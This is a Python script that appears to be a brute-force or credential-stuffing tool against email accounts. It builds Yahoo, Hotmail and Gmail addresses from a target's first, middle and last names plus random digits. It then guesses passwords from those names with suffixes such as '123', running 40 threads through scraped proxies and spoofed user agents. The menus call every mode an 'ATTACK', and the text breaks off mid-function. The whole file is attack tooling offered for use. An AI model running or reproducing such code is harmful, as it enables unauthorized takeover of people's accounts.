import requests,json,os,sys,random,secrets,re,string,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import sleep as waktu
from time import time as mek
from string import *
from bs4 import BeautifulSoup as sop
import os,zlib,pip,urllib,random,requests

###----------[ GET PROXY ]----------###

try:
  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all').text
  open('zprox.txt','w').write(proxylist)
except Exception as e:
  print('NO CONNECTION!')
proxsi=open('zprox.txt','r').read().splitlines()

##-------------[UA]------------##

usergent=open('uaan.txt','r').read().splitlines()

###----------[ LOGO ]----------###
logo = ("""                   
    \033[0;31m╔╦╗╦ ╦╔═╗  \033[0;37m╔╦╗╔═╗╔═╗╦╔═  \033[0;34m╔╦╗╔═╗╔╗╔
     \033[0;31m║ ╠═╣║╣   \033[0;37m║║║╠═╣╚═╗╠╩╗  \033[0;34m║║║╠═╣║║║
     \033[0;31m╩ ╩ ╩╚═╝  \033[0;37m╩ ╩╩ ╩╚═╝╩ ╩  \033[0;34m╩ ╩╩ ╩╝╚╝
\x1b[1;90m══════════════════════════════════════════""")
loop = 0
oks = []
ok =[]
cp = []
cps = []
uid = []
pcp = []
id = []
def menu():
	os.system('clear')
	print(logo)
	print(' \x1b[1;91m[\x1b[1;97m𝟏\x1b[1;91m] \x1b[1;97mNO DIGIT ATTACK   \x1b[1;91m[\x1b[1;97m𝟐\x1b[1;91m] \x1b[1;97m2 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟑\x1b[1;91m] \x1b[1;97m3 DIGI ATTACK     \x1b[1;91m[\x1b[1;97m𝟒\x1b[1;91m] \x1b[1;97m4 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟓\x1b[1;91m] \x1b[1;97m5 DIGIT ATTACK    \x1b[1;91m[\x1b[1;97m𝟔\x1b[1;91m] \x1b[1;97m6 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟕\x1b[1;91m] \x1b[1;97m7 DIGIT ATTACK    \x1b[1;91m[\x1b[1;97m𝟖\x1b[1;91m] \x1b[1;97m8 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟗\x1b[1;91m] \x1b[1;97mFULL ATTACK       \x1b[1;91m[\x1b[1;97m𝟏𝟎\x1b[1;91m] \x1b[1;97mSINGLE ATTACK')
	print("\x1b[1;90m══════════════════════════════════════════")
	opt = input('\x1b[1;97m[●] ENTER YOUR CHOICE: ')
	if opt =='1':
		modh0()
	elif opt =='2':
		modh1()
	elif opt =='3':
		modh2()
	elif opt =='4':
		modh3()
	elif opt =='5':
		modh4()
	elif opt =='6':
		modh5()
	elif opt =='7':
		modh6()
	elif opt =='8':
		modh7()
	elif opt =='f':
		khaa6()
	elif opt =='s':
		khaa7()
  		
def modh0():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(0))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀]  NO DIGIT ATTACK \033[1;97m\033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode+kodex}{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+guru,kodex+guru,kode+kodex+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")
    
#____
def modh1():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(2))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟐】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode+kodex}★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+guru,kodex+guru,kode+kodex+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m\x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")
    
#____     
def modh2():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(3))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟑】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode+kodex}★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+guru,kodex+guru,kode+kodex+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")
    
#____     
def modh3():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(4))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟒】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode+kodex}★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+guru,kodex+guru,kode+kodex+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")
    
#____     
def modh4():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(5))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟓】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode+kodex}★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+guru,kodex+guru,kode+kodex+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")
    
#____     
def modh5():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(6))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟔】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode+kodex}★★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+guru,kodex+guru,kode+kodex+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")

#____     
def modh6():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(7))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟕】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode+kodex}★★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+guru,kodex+guru,kode+kodex+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")
    
#____     
def modh7():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(8))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟖】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode+kodex}★★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+guru,kodex+guru,kode+kodex+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")
    
    
#____     
def khaa6():
	user=[]
	os.system('clear')
	print(logo)
	print(' \x1b[1;91m[\x1b[1;97m𝟏\x1b[1;91m] \x1b[1;97mNO DIGIT ATTACK   \x1b[1;91m[\x1b[1;97m𝟐\x1b[1;91m] \x1b[1;97m2 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟑\x1b[1;91m] \x1b[1;97m3 DIGI ATTACK     \x1b[1;91m[\x1b[1;97m𝟒\x1b[1;91m] \x1b[1;97m4 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟓\x1b[1;91m] \x1b[1;97m5 DIGIT ATTACK    \x1b[1;91m[\x1b[1;97m𝟔\x1b[1;91m] \x1b[1;97m6 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟕\x1b[1;91m] \x1b[1;97m7 DIGIT ATTACK    \x1b[1;91m[\x1b[1;97m𝟖\x1b[1;91m] \x1b[1;97m8 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟗\x1b[1;91m] \x1b[1;97m9 DIGIT ATTACK    \x1b[1;91m[\x1b[1;97m𝟏𝟎\x1b[1;91m] \x1b[1;97mGO BACK MENU')
	print("\x1b[1;90m══════════════════════════════════════════")
	opt = input('\x1b[1;97m[●] ENTER YOUR CHOICE: ')
	if opt =='1':
		naki1()
	elif opt =='2':
		naki2()
	elif opt =='3':
		naki3()
	elif opt =='4':
		naki4()
	elif opt =='5':
		naki5()
	elif opt =='6':
		naki6()
	elif opt =='7':
		naki7()
	elif opt =='8':
		naki8()
	elif opt =='9':
		naki9()
	elif opt =='m':
		menu()
def naki1():
    user=[]
    os.system('clear')
    print(logo)
    kod = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER MIDDLE NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(0))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀]  No DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kod+kode+kodex+doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kod+kode+kodex+guru+doamin
            pwx = [kode,kodex,kod+kode+kodex,kod+kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'123456',kod+kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")   
#____ 
def naki2():
    user=[]
    os.system('clear')
    print(logo)
    kod = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER MIDDLE NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(2))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟐】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kod+kode+kodex}★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kod+kode+kodex+guru+doamin
            pwx = [kode,kodex,kod+kode+kodex,kod+kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'123456',kod+kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")   
#____ 
def naki3():
    user=[]
    os.system('clear')
    print(logo)
    kod = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER MIDDLE NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(3))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟑】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kod+kode+kodex}★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kod+kode+kodex+guru+doamin
            pwx = [kode,kodex,kod+kode+kodex,kod+kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'123456',kod+kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")   
#____ 
def naki4():
    user=[]
    os.system('clear')
    print(logo)
    kod = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER MIDDLE NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(4))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟒】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kod+kode+kodex}★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kod+kode+kodex+guru+doamin
            pwx = [kode,kodex,kod+kode+kodex,kod+kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'123456',kod+kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")   
#____ 
def naki5():
    user=[]
    os.system('clear')
    print(logo)
    kod = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER MIDDLE NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(5))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟓】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kod+kode+kodex}★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kod+kode+kodex+guru+doamin
            pwx = [kode,kodex,kod+kode+kodex,kod+kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'123456',kod+kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")   
#____ 
def naki6():
    user=[]
    os.system('clear')
    print(logo)
    kod = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER MIDDLE NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(6))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟔】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kod+kode+kodex}★★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kod+kode+kodex+guru+doamin
            pwx = [kode,kodex,kod+kode+kodex,kod+kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'123456',kod+kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")   
#____ 
def naki7():
    user=[]
    os.system('clear')
    print(logo)
    kod = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER MIDDLE NAME : ')
